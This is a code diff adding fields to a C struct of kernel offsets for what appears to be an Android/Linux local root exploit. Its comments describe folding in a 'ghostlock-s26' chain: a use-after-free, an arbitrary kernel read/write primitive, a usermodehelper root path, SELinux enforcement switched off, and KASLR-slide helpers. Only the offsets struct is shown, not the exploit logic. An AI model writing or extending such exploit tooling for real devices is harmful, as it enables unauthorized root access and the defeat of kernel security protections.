@@ -45,6 +45,31 @@ struct kernel_offsets {
     uint32_t cred_off_user_ns;
     uint32_t cred_off_ucounts;
     uint32_t cred_off_groups;
+    /*
+     * v5: ghostlock-s26 post-UAF / UMH root offsets (optional; 0 = unavailable).
+     * These enable the attr-carrier arb R/W + usermodehelper workqueue root path
+     * integrated from ghostlock-s26, and can be populated from boot.img via
+     * mkprofile.py or on-device kallsyms extraction.
+     */
+    uint64_t init_task;
+    uint64_t root_task_group;
+    uint64_t misc_list;
+    uint64_t uinput_misc;
+    uint64_t simple_attr_read;
+    uint64_t simple_attr_write;
+    uint64_t debugfs_u64_get;
+    uint64_t debugfs_u64_set;
+    uint64_t debugfs_u64_format;
+    uint64_t default_llseek;
+    uint64_t call_usermodehelper_exec_work;
+    uint64_t system_unbound_wq;
+    uint64_t selinux_enforcing_off;
+    /* tracefs/KASLR-slide helpers and physical map params (ghostlock-s26) */
+    uint64_t tracefs_worker_caller_off;
+    uint64_t phys_offset;
+    uint64_t phys_load;
+    uint32_t tracefs_event_id;
+    uint32_t gl_reserved;
 };
 
 // Load offsets from stdin (length-prefixed blob)
